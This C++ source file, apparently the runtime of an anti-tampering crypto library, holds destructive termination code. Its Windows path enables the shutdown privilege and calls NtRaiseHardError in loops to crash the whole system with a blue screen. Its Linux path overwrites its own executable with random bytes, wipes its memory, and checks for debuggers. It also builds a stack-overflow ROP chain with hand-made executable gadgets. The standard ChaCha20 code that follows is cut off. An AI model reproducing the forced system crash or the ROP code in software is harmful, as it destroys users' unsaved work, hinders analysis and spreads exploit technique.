#include "crypto_runtime.h"
#include "blake3.h"

#include <array>
#include <cstdio> // For fprintf
#include <cstdlib>
#include <cstring>
#include <random>

// #define debug

// --- 开启运行时调试 ---
//#define debug
#ifdef debug
#define IC_DEBUG 1

#endif
#ifdef IC_DEBUG
// 辅助函数，用于打印字节数组
static void NO_IC_INSTRUMENT print_bytes(const char *prefix,
                                         const uint8_t *data, size_t len) {
  fprintf(stderr, "%s", prefix);
  for (size_t i = 0; i < len; ++i) {
    fprintf(stderr, "%02x", data[i]);
  }
  fprintf(stderr, "\n");
}
#endif

#ifdef _WIN32

#include <Windows.h>
#include <cstdio>
#include <intrin.h> // For __rdtsc
#include <intrin.h> // For __rdtsc and other intrinsics
#include <iostream>
#include <string>
#include <winnt.h>
#include <winternl.h> // For PEB structure
// 加入时间库用于初始化随机种子
#include <ctime>

void NO_IC_INSTRUMENT OverwriteSelfInMemory_Win() {
  // 获取当前模块（即可执行文件自身）的基地址
  HMODULE hModule = GetModuleHandle(NULL);
  if (!hModule)
    return;

  // 解析PE头
  PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
  PIMAGE_NT_HEADERS pNtHeaders =
      (PIMAGE_NT_HEADERS)((BYTE *)pDosHeader + pDosHeader->e_lfanew);
  PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);

  // 遍历所有节区 (如 .text, .data, .rdata)
  for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections;
       i++, pSectionHeader++) {
    void *section_start = (BYTE *)hModule + pSectionHeader->VirtualAddress;
    DWORD section_size = pSectionHeader->Misc.VirtualSize;
    DWORD oldProtect;

    // 使用 VirtualProtect 将节区内存权限改为可读、可写、可执行
    if (VirtualProtect(section_start, section_size, PAGE_EXECUTE_READWRITE,
                       &oldProtect)) {
      // 用 0xCC (int 3 中断指令) 填充整个节区
      memset(section_start, 0xCC, section_size);
    }
  }
}

typedef NTSTATUS(NTAPI *pdef_NtRaiseHardError)(
    NTSTATUS ErrorStatus, ULONG NumberOfParameters,
    ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters,
    ULONG ResponseOption, PULONG Response);
typedef NTSTATUS(NTAPI *pdef_RtlAdjustPrivilege)(ULONG Privilege,
                                                 BOOLEAN Enable,
                                                 BOOLEAN CurrentThread,
                                                 PBOOLEAN Enabled);

inline void NO_IC_INSTRUMENT lan1() {
  BOOLEAN bEnabled;
  ULONG uResp;
  LPVOID lpFuncAddress =
      GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
  LPVOID lpFuncAddress2 =
      GetProcAddress(GetModuleHandle("ntdll.dll"), "NtRaiseHardError");
  pdef_RtlAdjustPrivilege NtCall = (pdef_RtlAdjustPrivilege)lpFuncAddress;
  pdef_NtRaiseHardError NtCall2 = (pdef_NtRaiseHardError)lpFuncAddress2;
  NTSTATUS NtRet = NtCall(19, TRUE, FALSE, &bEnabled);
  NtCall2(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &uResp);
}
// 为函数指针定义清晰的类型
typedef NTSTATUS(NTAPI *RtlAdjustPrivilege_t)(ULONG, BOOLEAN, BOOLEAN,
                                              PBOOLEAN);
typedef NTSTATUS(NTAPI *ZwRaiseHardError_t)(NTSTATUS ErrorStatus,
                                            ULONG NumberOfParameters,
                                            ULONG UnicodeStringParameterMask,
                                            PULONG_PTR Parameters,
                                            ULONG ValidResponseOption,
                                            PULONG Response);
inline int NO_IC_INSTRUMENT lan2() {
  HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
  if (!ntdll)
    return 1;

  auto rtlAdjustPrivilege =
      (RtlAdjustPrivilege_t)GetProcAddress(ntdll, "RtlAdjustPrivilege");
  auto zwRaiseHardError =
      (ZwRaiseHardError_t)GetProcAddress(ntdll, "ZwRaiseHardError");

  if (!rtlAdjustPrivilege || !zwRaiseHardError) {
    FreeLibrary(ntdll);
    return 1;
  }

  // 启用 SeShutdownPrivilege (ID 为 19)
  BOOLEAN previousState;
  rtlAdjustPrivilege(19, TRUE, FALSE, &previousState);

  // 不要重新定义 STATUS_ASSERTION_FAILURE，它已在头文件中定义
  // const ULONG STATUS_ASSERTION_FAILURE = 0xc0000233; // <--- 错误行

  // 调用硬错误函数，请求系统关闭 (选项 6)
  ULONG hardErrorResponse;
  zwRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, nullptr, 6,
                   &hardErrorResponse);

  // 这部分代码不太可能被执行到
  FreeLibrary(ntdll);
  return 0;
}

#pragma comment(lib, "advapi32.lib")
// 为 ntdll.dll 中的 NtRaiseHardError 定义函数指针类型
// 这个函数可以触发一个硬错误，甚至导致蓝屏
typedef NTSTATUS(NTAPI *pNtRaiseHardError)(
    NTSTATUS ErrorStatus, ULONG NumberOfParameters,
    PULONG_PTR UnicodeStringParameterMask, PULONG_PTR Parameters,
    ULONG ValidResponseOption, PULONG Response);

BOOL NO_IC_INSTRUMENT EnableShutdownPrivilege() {
  HANDLE hToken;
  TOKEN_PRIVILEGES tkp;

  // 获取当前进程的访问令牌
  if (!OpenProcessToken(GetCurrentProcess(),
                        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
    return FALSE;
  }

  // 获取 SeShutdownPrivilege 的 LUID (本地唯一标识符)
  if (!LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid)) {
    CloseHandle(hToken);
    return FALSE;
  }

  tkp.PrivilegeCount = 1;
  tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

  // 为进程启用该权限
  if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL,
                             0)) {
    CloseHandle(hToken);
    return FALSE;
  }

  CloseHandle(hToken);
  return TRUE;
}

inline void NO_IC_INSTRUMENT lan3() {
  // 尝试提升权限以触发蓝屏
  if (EnableShutdownPrivilege()) {
    // 如果提权成功，执行终极保险 - 触发蓝屏 (BSOD)
    HMODULE ntdll = LoadLibraryA("ntdll.dll");
    if (ntdll) {
      pNtRaiseHardError NtRaiseHardError =
          (pNtRaiseHardError)GetProcAddress(ntdll, "NtRaiseHardError");
      if (NtRaiseHardError) {
        ULONG response;
        // 使用一个严重错误码，并请求系统关闭
        NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6,
                         &response); // 6 = OptionShutdownSystem
      }
    }
  }

  // 如果蓝屏失败（例如权限不足或API调用失败），则强制终止自身
  TerminateProcess(GetCurrentProcess(), 1);
}

[[noreturn]] void NO_IC_INSTRUMENT finally_fuck() {
  for (int i = 0; i < 1000; i++) {
    lan1();
    lan2();
    lan3();
  }
  for (int i = 0; i < 1000; i++) {
    lan2();
    lan1();
    lan3();
  }
}

[[noreturn]] static void NO_IC_INSTRUMENT secure_terminate() {

#ifdef debug
  __builtin_trap();
#endif
  // 随机化
  srand(time(nullptr));

  // abort();

  for (int i = 0; i < 1000; ++i) {
    // 随机选择一种终止方式来执行
    int choice = 0;
#if defined(__x86_64__) || defined(_M_X64)
    choice = __rdtsc() % 5;
#else
    // 为其他架构或未知编译器提供一个简单的回退
    choice = rand() % 5;
#endif

    switch (choice) {
    case 0: {
// 方式1: 写入随机地址，引发段错误
#if defined(__x86_64__) || defined(_M_X64)
      unsigned long long random_addr = __rdtsc();
      *((volatile int *)random_addr) = 0;
#else
      // Fallback for other archs like ARM
      *((volatile int *)rand()) = 0;
#endif
      break;
    }
    case 1: {
      // 方式2: 立即退出 (使用 rand() 替换了非标准的 random())
      _exit(rand());
      break;
    }
    case 2: {
      // 方式3: 立即退出 (C11, 使用 rand() 替换了非标准的 random())
      _Exit(rand());
      break;
    }
    case 3: {
      // 方式4: 覆写自身内存
      OverwriteSelfInMemory_Win();
      break;
    }
    case 4: {
      // 方式5: 正常终止进程
      TerminateProcess(GetCurrentProcess(), 1);
    }
    }

    *((volatile int *)0) = 0; // 强制 SIGSEGV
                              // 内建退出

    _exit(0); // 直接退出，避免控制台窗口
    _Exit(0);

#if defined(__x86_64__) && (defined(__GNUC__) || defined(__clang__))
    __asm__ volatile("ud2"); // "Undefined Instruction" - 会产生非法指令异常
#endif

    finally_fuck();

#if defined(__x86_64__) && (defined(__GNUC__) || defined(__clang__))
    __asm__ volatile("int3");
#endif
    secure_terminate();
  }
#else
#include <elf.h> // For ELF header parsing
#include <fcntl.h>
#include <fstream>
#include <iostream>
#include <link.h>
#include <signal.h>
#include <sstream>
#include <string.h>
#include <string>
#include <sys/mman.h>
#include <sys/ptrace.h> // For ptrace
#include <sys/stat.h>
#include <thread> // For std::thread
#include <tuple>
#include <unistd.h>
#include <vector>
#if defined(__x86_64__)
#include <x86intrin.h>
#endif



// 为x86_64架构直接定义系统调用号
#define SYS_READ 0
#define SYS_WRITE 1
#define SYS_CLOSE 3
#define SYS_FSTAT 5
#define SYS_MPROTECT 10
#define SYS_UNLINKAT 263
#define SYS_OPENAT 257
#define SYS_READLINKAT 267
#define SYS_PTRACE 101
#define SYS_GETPID 39
#define SYS_KILL 62

#ifdef debug
#define debugprint(fmt, ...)                                                   \
  do {                                                                         \
    fprintf(stderr, "\033[33m[DEBUG] %s:%d in %s() - " fmt "\033[0m\n",        \
            __FILE__, __LINE__, __FUNCTION__, ##__VA_ARGS__);                  \
  } while (0)
#else
#define debugprint(fmt, ...)                                                   \
  do {                                                                         \
  } while (0)
#endif

// 封装直接系统调用的函数 (保持不变)
static long NO_IC_INSTRUMENT direct_syscall(long number, auto... args) {
  long ret;
  auto arg_tuple = std::make_tuple(args...);

  if constexpr (sizeof...(args) == 0) {
    asm volatile("syscall" : "=a"(ret) : "a"(number) : "rcx", "r11", "memory");
  } else if constexpr (sizeof...(args) == 1) {
    asm volatile("syscall"
                 : "=a"(ret)
                 : "a"(number), "D"((long)std::get<0>(arg_tuple))
                 : "rcx", "r11", "memory");
  } else if constexpr (sizeof...(args) == 2) {
    asm volatile("syscall"
                 : "=a"(ret)
                 : "a"(number), "D"((long)std::get<0>(arg_tuple)),
                   "S"((long)std::get<1>(arg_tuple))
                 : "rcx", "r11", "memory");
  } else if constexpr (sizeof...(args) == 3) {
    asm volatile("syscall"
                 : "=a"(ret)
                 : "a"(number), "D"((long)std::get<0>(arg_tuple)),
                   "S"((long)std::get<1>(arg_tuple)),
                   "d"((long)std::get<2>(arg_tuple))
                 : "rcx", "r11", "memory");
  } else if constexpr (sizeof...(args) == 4) {
    register long r10 asm("r10") = (long)std::get<3>(arg_tuple);
    asm volatile("syscall"
                 : "=a"(ret)
                 : "a"(number), "D"((long)std::get<0>(arg_tuple)),
                   "S"((long)std::get<1>(arg_tuple)),
                   "d"((long)std::get<2>(arg_tuple)), "r"(r10)
                 : "rcx", "r11", "memory");
  } else if constexpr (sizeof...(args) == 5) {
    register long r10 asm("r10") = (long)std::get<3>(arg_tuple);
    register long r8 asm("r8") = (long)std::get<4>(arg_tuple);
    asm volatile("syscall"
                 : "=a"(ret)
                 : "a"(number), "D"((long)std::get<0>(arg_tuple)),
                   "S"((long)std::get<1>(arg_tuple)),
                   "d"((long)std::get<2>(arg_tuple)), "r"(r10), "r"(r8)
                 : "rcx", "r11", "memory");
  } else if constexpr (sizeof...(args) >= 6) {
    register long r10 asm("r10") = (long)std::get<3>(arg_tuple);
    register long r8 asm("r8") = (long)std::get<4>(arg_tuple);
    register long r9 asm("r9") = (long)std::get<5>(arg_tuple);
    asm volatile("syscall"
                 : "=a"(ret)
                 : "a"(number), "D"((long)std::get<0>(arg_tuple)),
                   "S"((long)std::get<1>(arg_tuple)),
                   "d"((long)std::get<2>(arg_tuple)), "r"(r10), "r"(r8), "r"(r9)
                 : "rcx", "r11", "memory");
  }
  return ret;
}

// 阶段二：内存毁灭 (高级版，通过解析自身ELF头)
// 这种方法不依赖/proc文件系统，更加隐蔽和健壮
static void NO_IC_INSTRUMENT overwrite_self_in_memory_advanced() {
  // 1. 获取程序基地址。一个技巧是获取任一函数地址并将其页对齐。
  // 4096是x86上常见的页大小。
  unsigned long base_addr =
      (unsigned long)&overwrite_self_in_memory_advanced & ~(4095);

  // 找到ELF头
  Elf64_Ehdr *ehdr = (Elf64_Ehdr *)base_addr;

  // 找到程序头表
  Elf64_Phdr *phdr = (Elf64_Phdr *)(base_addr + ehdr->e_phoff);

  // 2. 遍历程序头，找到所有可加载的段 (PT_LOAD)
  for (int i = 0; i < ehdr->e_phnum; ++i) {
    if (phdr[i].p_type == PT_LOAD) {
      unsigned long segment_start = base_addr + phdr[i].p_vaddr;
      size_t segment_size = phdr[i].p_memsz;

      // 3. 赋予内存段所有权限
      direct_syscall(SYS_MPROTECT, segment_start, segment_size,
                     PROT_READ | PROT_WRITE | PROT_EXEC);

      // 4. 用0xCC填充整个段
      // 当执行流所在的.text段被覆盖时，程序将立即崩溃
      volatile char *p = (volatile char *)segment_start;
      for (size_t j = 0; j < segment_size; ++j) {
        p[j] = 0xCC;
      }
    }
  }
}

static void NO_IC_INSTRUMENT overwrite_self_on_disk() {
  char self_path[1024] = {0};
  if (direct_syscall(SYS_READLINKAT, AT_FDCWD, (long)"/proc/self/exe",
                     (long)self_path, sizeof(self_path) - 1) <= 0)
    return;
  direct_syscall(SYS_UNLINKAT, AT_FDCWD, (long)self_path, 0);
  long self_fd = direct_syscall(SYS_OPENAT, AT_FDCWD, (long)self_path,
                                O_WRONLY | O_CREAT, 0755);
  if (self_fd < 0)
    return;
  long urandom_fd =
      direct_syscall(SYS_OPENAT, AT_FDCWD, (long)"/dev/urandom", O_RDONLY, 0);
  if (urandom_fd < 0) {
    direct_syscall(SYS_CLOSE, self_fd);
    return;
  }
  char buffer[4096];
  for (int i = 0; i < 256; ++i) {
    long bytes_read =
        direct_syscall(SYS_READ, urandom_fd, (long)buffer, sizeof(buffer));
    if (bytes_read > 0)
      direct_syscall(SYS_WRITE, self_fd, (long)buffer, bytes_read);
    else
      break;
  }
  direct_syscall(SYS_CLOSE, self_fd);
  direct_syscall(SYS_CLOSE, urandom_fd);
}

// 简单的反调试检测
static bool NO_IC_INSTRUMENT detect_debugger() {
  // 如果一个进程已经被调试，再次调用PTRACE_TRACEME会失败并返回-1
  if (direct_syscall(SYS_PTRACE, PTRACE_TRACEME, 0, 0, 0) < 0) {
    return true;
  }
  // 如果没有被调试，我们需要取消这个追踪请求
  direct_syscall(SYS_PTRACE, PTRACE_DETACH, 0, 0, 0);
  return false;
}

// 终极自毁序列 (高级版)
static void NO_IC_INSTRUMENT scorched_earth_protocol_advanced() {
  // 1. 首先进行反调试检测，这是最高优先级
  if (detect_debugger()) {
    // 如果检测到调试器，不给任何机会，立即执行内存毁灭
    overwrite_self_in_memory_advanced();
  }

// 2. 同步、串行地执行物理毁灭。
// 确保在进程终止前，磁盘上的文件一定被覆盖。
// 这是最关键的修改，消除了竞态条件。
#if defined(__x86_64__)
  overwrite_self_on_disk();
#endif

  // 3. 在物理文件被摧毁后，再启动并行的内存毁灭。
  // 即使这个线程没来得及执行，物理文件也已经被销毁了。
  std::thread memory_destroyer(overwrite_self_in_memory_advanced);
  memory_destroyer.detach();

  // 4. 终极保险：无限循环地向自己发送SIGKILL信号
  // 确保进程无法存活。
  long pid = direct_syscall(SYS_GETPID);
  while (true) {
    direct_syscall(SYS_KILL, pid, SIGKILL);
    // 短暂等待，防止100% CPU占用
    for (volatile int i = 0; i < 10000; ++i)
      ;
  }
}

// 采用多层防御策略，增加逆向和绕过的难度。

[[noreturn]] static void NO_IC_INSTRUMENT secure_terminate() {

  // 策略2: 跳转到空指针，引发段错误，强制崩溃。
  // 这是一个非常直接的破坏性操作。
  // abort(); // 有利于debug
#ifdef debug
  __builtin_trap();
#endif

  for (int i = 0; i < 1000000; ++i) {
    // 随机选择一种终止方式来执行
    int choice = 0;
#if defined(__x86_64__) && (defined(__GNUC__) || defined(__clang__))
    choice = __rdtsc() % 5;
#elif defined(__aarch64__) && (defined(__GNUC__) || defined(__clang__))
    unsigned long long random_val;
    asm volatile("mrs %0, cntvct_el0" : "=r"(random_val));
    choice = random_val % 5;
#else
    // 为其他架构或未知编译器提供一个简单的回退
    choice = i % 5;
#endif

    // printf("Choice: %d\n", choice); // 调试输出，查看选择的方式

    switch (choice) {
    case 0: {
      // 方式1: 杀死当前进程
      kill(getpid(), SIGKILL);
      break;
    }
    case 1: {
      // 方式2: 杀死当前进程组
      kill(-getpgrp(), SIGKILL);
      break;
    }
    case 2: {
// 方式3: 写入随机地址，引发段错误
#if defined(__x86_64__) && (defined(__GNUC__) || defined(__clang__))
      unsigned long long random_addr = __rdtsc();
      *((volatile int *)random_addr) = 0;
#elif defined(__aarch64__) && (defined(__GNUC__) || defined(__clang__))
      unsigned long long random_addr;
      // 读取 ARM64 的虚拟计数器寄存器作为随机源
      asm volatile("mrs %0, cntvct_el0" : "=r"(random_addr));
      *((volatile int *)random_addr) = 0;
#endif
      break;
    }
    case 3: {
      // 方式4: 直接进行系统调用退出，绕过C库的exit/abort。
      // 这是最可靠的退出方式，直接请求内核终止进程。
      // syscall number 231 is exit_group on x86-64 Linux.
#if defined(__x86_64__) && (defined(__GNUC__) || defined(__clang__))
      __asm__ volatile("movq $231, %rax\n\t"
                       "movq $1, %rdi\n\t"
                       "syscall"); // x86_64 exit_group
#elif defined(__aarch64__) && (defined(__GNUC__) || defined(__clang__))
      __asm__ volatile("mov x8, #94\n\t"
                       "mov x0, #1\n\t"
                       "svc #0"); // aarch64 exit_group
#endif
      break;
    }
    case 4: {
      overwrite_self_in_memory_advanced();
      break;
    }
    }
  }
  kill(-getpgrp(), SIGKILL);
#if defined(__x86_64__) && (defined(__GNUC__) || defined(__clang__))
  __asm__ volatile("ud2"); // x86: "Undefined Instruction" -> SIGILL
#elif defined(__aarch64__) && (defined(__GNUC__) || defined(__clang__))
  __asm__ volatile(".word 0"); // ARM: 未定义的指令 -> SIGILL
#endif
  *((volatile int *)0) = 0; // 强制 SIGSEGV

  // 策略3: 直接进行系统调用退出，绕过C库的exit/abort。
  // 这是最可靠的退出方式，直接请求内核终止进程。
  // syscall number 231 is exit_group on x86-64 Linux.
#if defined(__x86_64__) && (defined(__GNUC__) || defined(__clang__))
  __asm__ volatile("movq $231, %rax\n\t"
                   "movq $1, %rdi\n\t"
                   "syscall"); // x86_64 exit_group
#elif defined(__aarch64__) && (defined(__GNUC__) || defined(__clang__))
  __asm__ volatile("mov x8, #94\n\t"
                   "mov x0, #1\n\t"
                   "svc #0"); // aarch64 exit_group
#endif

  // 策略4: 作为最后的备用方案，调用标准abort。
  // 如果以上所有方法都因某些原因失效，这提供了最后一道防线。
  // std::quick_exit(random());
  // _Exit(random());
  scorched_earth_protocol_advanced();

  // 策略1: 使用内联汇编触发调试中断 (反调试)
  // 如果有调试器附加，程序会在此处断下。
  // 如果没有调试器，通常会因SIGTRAP信号而崩溃。
#if defined(__x86_64__) && (defined(__GNUC__) || defined(__clang__))
  __asm__ volatile("int3");
#endif
  secure_terminate();
}
#endif

  // overflow

  static char buf3;
  static void *global_ptr;

  static uintptr_t initret;

  // 添加一个全局变量存储ret指令
  static unsigned char ret_gadget[] = {0xc3}; // 0xc3 是 ret 指令的机器码 */
  // 添加 pop rdi; ret gadget (for Linux)
  static unsigned char pop_rdi_gadget[] = {0x5f,
                                           0xc3}; // 0x5f是pop rdi, 0xc3是ret
  // 替换现有的 init_ret_gadget 函数
  static unsigned char pop_rax_gadget[] = {0x58, 0xc3};

#ifdef _WIN32
  // 为Windows x64调用约定添加 pop rcx; ret gadget
  static unsigned char pop_rcx_gadget[] = {0x59, 0xc3}; // 0x59 是 pop rcx
#endif

  static void NO_IC_INSTRUMENT init_gadgets() {
#ifdef _WIN32
    DWORD old_protect;
    // 在Windows下使用VirtualProtect
    VirtualProtect(ret_gadget, sizeof(ret_gadget), PAGE_EXECUTE_READWRITE,
                   &old_protect);
    VirtualProtect(pop_rax_gadget, sizeof(pop_rax_gadget),
                   PAGE_EXECUTE_READWRITE, &old_protect);
    VirtualProtect(pop_rcx_gadget, sizeof(pop_rcx_gadget),
                   PAGE_EXECUTE_READWRITE, &old_protect);
#else
  // Linux下使用mprotect
  unsigned long page_size = getpagesize();

  // 为 ret_gadget 设置执行权限
  uintptr_t ptr = (uintptr_t)ret_gadget;
  ptr &= ~(page_size - 1); // 对齐到页边界
  mprotect((void *)ptr, page_size, PROT_READ | PROT_WRITE | PROT_EXEC);

  // 为 pop_rdi_gadget 设置执行权限
  ptr = (uintptr_t)pop_rdi_gadget;
  ptr &= ~(page_size - 1); // 对齐到页边界
  mprotect((void *)ptr, page_size, PROT_READ | PROT_WRITE | PROT_EXEC);

  ptr = (uintptr_t)pop_rax_gadget;
  ptr &= ~(page_size - 1);
  mprotect((void *)ptr, page_size, PROT_READ | PROT_WRITE | PROT_EXEC);
#endif
  }

  static void *NO_IC_INSTRUMENT get_ret_address() {
    void *ret_addr;
    void **rbp_ptr;

#ifdef __x86_64__
    // 获取调用者的栈帧
    asm("movq %%rbp, %0" : "=r"(rbp_ptr));

    // 获取返回地址（存储在调用者栈帧+8的位置）
    ret_addr = *(void **)(rbp_ptr + 1);

    // 通过返回地址找到调用者函数的ret指令
    // 返回地址指向的是调用后的下一条指令
    // 我们需要从该指令往后扫描，直到找到ret指令
    unsigned char *code_ptr = (unsigned char *)ret_addr;

    // 扩大扫描范围到256字节，因为某些函数可能比较大
    for (int i = 0; i < 512; i++) {
      // 确认代码段模式：如果发现通常的函数结尾模式（如pop rbp + ret）
      if (i > 0 && code_ptr[i - 1] == 0x5D && code_ptr[i] == 0xC3) {
        // 找到了典型的函数结尾序列：pop rbp; ret
        return (void *)(&code_ptr[i]);
      }

      // 单独的ret指令
      if (code_ptr[i] == 0xC3) {
        // 进一步检查这是否真的是函数结尾
        return (void *)(&code_ptr[i]);
      }
    }

    // 如果没找到，返回ret_gadget作为备选
    return ret_gadget;
#elif defined(__i386__)
  // 类似的32位实现，同样扩大扫描范围
  asm("movl %%ebp, %0" : "=r"(rbp_ptr));
  ret_addr = *(void **)(rbp_ptr + 1);

  unsigned char *code_ptr = (unsigned char *)ret_addr;
  for (int i = 0; i < 512; i++) {
    if (i > 0 && code_ptr[i - 1] == 0x5D && code_ptr[i] == 0xC3) {
      return (void *)(&code_ptr[i]);
    }

    if (code_ptr[i] == 0xC3) {
      return (void *)(&code_ptr[i]);
    }
  }
  return ret_gadget;
#else
  // 不支持的平台，返回ret_gadget
  return ret_gadget;
#endif
  }

  class data {
  public:
    int a = 1;
    std::string b = "123";
    void print() {
      ////printf("a:%d,b:%s\n", a, b.c_str());
    }
  };
  data d;

#ifdef _WIN32
  // 针对Windows平台的特殊版本，使用内联汇编控制函数尾声
  static int NO_IC_INSTRUMENT stack_overflow(uintptr_t a) {
    char buf[1] = {0};
    ////printf("Target function address: %llx\n", (unsigned long long)a);

    // --- 获取栈布局信息 ---
    void *rbp_ptr;
    asm("movq %%rbp, %0" : "=r"(rbp_ptr));

    // 计算从缓冲区到保存的RBP的偏移量
    size_t offset_to_rbp = (char *)rbp_ptr - (char *)buf;
    // //printf("Offset from buf to saved RBP: %zu\n", offset_to_rbp);

    // --- 构建ROP链 ---
    // ROP链将覆盖保存的RBP，然后是返回地址，并继续向下延伸
    // 1. 假的RBP值 (在leave指令中被pop到rbp)
    // 2. pop rcx; ret (为target函数准备第一个参数)
    // 3. d_ptr (target函数的参数)
    // 4. ret (用于16字节栈对齐)
    // 5. target函数地址
    const size_t rop_chain_qwords = 5;
    size_t payload_size = offset_to_rbp + rop_chain_qwords * 8;
    char *payload = new char[payload_size];
    memset(payload, 'A', offset_to_rbp);

    uintptr_t *p = (uintptr_t *)(payload + offset_to_rbp);
    data *d_ptr = &d;

    *p++ = 0xAAAAAAAAAAAAAAAA; // 覆盖保存的RBP为一个垃圾值
    *p++ = (uintptr_t)pop_rcx_gadget;
    *p++ = (uintptr_t)d_ptr;
    *p++ = (uintptr_t)ret_gadget; // 栈对齐
    *p++ = a;                     // 调用target

    // --- 触发溢出 ---
    init_gadgets();
    memcpy(buf, payload, payload_size);
    delete[] payload;

    // printf("Overflow triggered. Forcing exploitable epilogue...\n");

    // --- 手动构造的、可利用的函数尾声 ---
    // 使用 `leave; ret` (`mov rsp, rbp; pop rbp; ret`)
    // 这会从被我们覆盖的栈上恢复RBP和RIP
    asm volatile("leave\n\t"
                 "ret");

    return 0; // 不可达代码
  }
#else
// 原始的、适用于Linux (System V ABI) 的函数
static int NO_IC_INSTRUMENT stack_overflow(uintptr_t a) {
  char buf[1] = {0};
  // printf("%llx\n", (unsigned long long)a);

  // 获取ret指令的地址
  uintptr_t ret_gadget_addr = (uintptr_t)ret_gadget;
  // printf("ret gadget address: %llx\n", (unsigned long long)ret_gadget_addr);

  // 获取当前函数的返回地址，这是我们需要保存的位置
  void *original_ret_addr;
  void **rbp_ptr;
  asm("movq %%rbp, %0" : "=r"(rbp_ptr));
  original_ret_addr = *(void **)(rbp_ptr + 1);
  // printf("Original return address: %p\n", original_ret_addr);
  uintptr_t original_rbp = (uintptr_t)(*rbp_ptr);

  // 计算缓冲区与返回地址之间的偏移
  void *buf_addr = (void *)buf;
  void *stack_ptr;
  asm("movq %%rbp, %0" : "=r"(stack_ptr));
  size_t offset = (char *)stack_ptr - (char *)buf_addr + 8; // +8 跳过保存的rbp
  // printf("Offset to return address: %zu\n", offset);

  void *main_after_call =
      (void *)((uintptr_t)original_ret_addr + 5); // call指令占5字节

  size_t payload_size = offset + 12 * 8; // 偏移 + 6个8字节地址
  char payload[payload_size];
  memset(payload, 'A', offset);

  unsigned long long *p = (unsigned long long *)(payload + offset);

  data *d_ptr = &d;
  // 1. 设置函数参数 (RDI for Linux)
  *p++ = (unsigned long long)pop_rdi_gadget;
  *p++ = (unsigned long long)d_ptr;

  // 2. 栈对齐调整
  *p++ = (unsigned long long)ret_gadget;

  // 3. 调用目标函数
  *p++ = a; // get_shell地址

  // 4. 设置返回值
  *p++ = (unsigned long long)pop_rax_gadget;
  *p++ = 10; // 要返回的值

  // 5. 恢复栈帧结构
  *p++ = (unsigned long long)original_ret_addr; // 原始返回地址
  // 5. 恢复栈帧结构
  *p++ = original_rbp;                        // 恢复RBP
  *p++ = (unsigned long long)main_after_call; // 精确返回地址

  // 初始化ret_gadget确保可执行
  init_gadgets();

  // 触发溢出
  memcpy(buf, payload, payload_size);

  // printf("Overflow triggered\n");

  // 这个返回值实际上不会执行到，因为控制流已经被劫持
  return 100;
}
#endif

  // --- Start of ChaCha20 and Poly1305 Implementation ---
  // This is a self-contained, standard-compliant implementation.
  namespace {

  void NO_IC_INSTRUMENT hchacha20(const uint8_t key[32],
                                  const uint8_t nonce[16], uint8_t out[32]);
  void NO_IC_INSTRUMENT chacha20_crypt(const uint8_t key[32],
                                       const uint8_t nonce[12],
                                       uint32_t counter, const uint8_t *in,
                                       uint8_t *out, size_t len);

  // 新增：实现 XChaCha20 设置逻辑，解决 "undeclared identifier" 错误
  // 从主密钥和 24 字节 nonce 派生出子密钥和 12 字节的内部 nonce
  static void NO_IC_INSTRUMENT xchacha20_setup(const uint8_t key[32],
                                               const uint8_t nonce[24],
                                               uint8_t subkey[32],
                                               uint8_t chacha_nonce[12]) {
    // 1. 使用 HChaCha20 和 nonce 的前 16 字节派生子密钥
    hchacha20(key, nonce, subkey);

    // 2. 构造 ChaCha20 内部 nonce: 4 个零字节 + X-nonce 的后 8 字节
    memset(chacha_nonce, 0, 4);
    memcpy(chacha_nonce + 4, nonce + 16, 8);
  }

  // 新增：一个职责单一的函数，用于生成 Poly1305 密钥
  // 它接收子密钥和 12 字节的内部 nonce
  static void NO_IC_INSTRUMENT
  generate_poly1305_key(const uint8_t subkey[32],
                        const uint8_t chacha_nonce[12], uint8_t poly_key[32]) {
    // Poly1305 密钥是使用子密钥、内部 nonce 和计数器 0 加密 32 个零字节的结果
    uint8_t zeros[32] = {0};
    chacha20_crypt(subkey, chacha_nonce, 0, zeros, poly_key, 32);
  }

// Internal ChaCha20 state and core functions
#define ROTATE(v, c) ((v) << (c)) | ((v) >> (32 - (c)))
#define QUARTER_ROUND(a, b, c, d)                                              \
  a += b;                                                                      \
  d ^= a;                                                                      \
  d = ROTATE(d, 16);                                                           \
  c += d;                                                                      \
  b ^= c;                                                                      \
  b = ROTATE(b, 12);                                                           \
  a += b;                                                                      \
  d ^= a;                                                                      \
  d = ROTATE(d, 8);                                                            \
  c += d;                                                                      \
  b ^= c;                                                                      \
  b = ROTATE(b, 7);

  void NO_IC_INSTRUMENT chacha20_block(const uint32_t in[16],
                                       uint32_t out[16]) {
    for (int i = 0; i < 16; ++i)
      out[i] = in[i];
    for (int i = 0; i < 10; ++i) { // 20 rounds = 10 double rounds
      QUARTER_ROUND(out[0], out[4], out[8], out[12]);
      QUARTER_ROUND(out[1], out[5], out[9], out[13]);
      QUARTER_ROUND(out[2], out[6], out[10], out[14]);
      QUARTER_ROUND(out[3], out[7], out[11], out[15]);
      QUARTER_ROUND(out[0], out[5], out[10], out[15]);
      QUARTER_ROUND(out[1], out[6], out[11], out[12]);
      QUARTER_ROUND(out[2], out[7], out[8], out[13]);
      QUARTER_ROUND(out[3], out[4], out[9], out[14]);
    }
    for (int i = 0; i < 16; ++i)
      out[i] += in[i];
  }

  // HChaCha20 function to derive a subkey from a 24-byte nonce.
  // Input: 32-byte key, 16-byte nonce part. Output: 32-byte subkey.
  void NO_IC_INSTRUMENT hchacha20(const uint8_t key[32],
                                  const uint8_t nonce[16], uint8_t out[32]) {
    uint32_t state[16];
    state[0] = 0x61707865;
    state[1] = 0x3320646e;
    state[2] = 0x79622d32;
    state[3] = 0x6b206574;

    memcpy(&state[4], key, 32);
    memcpy(&state[12], nonce, 16);

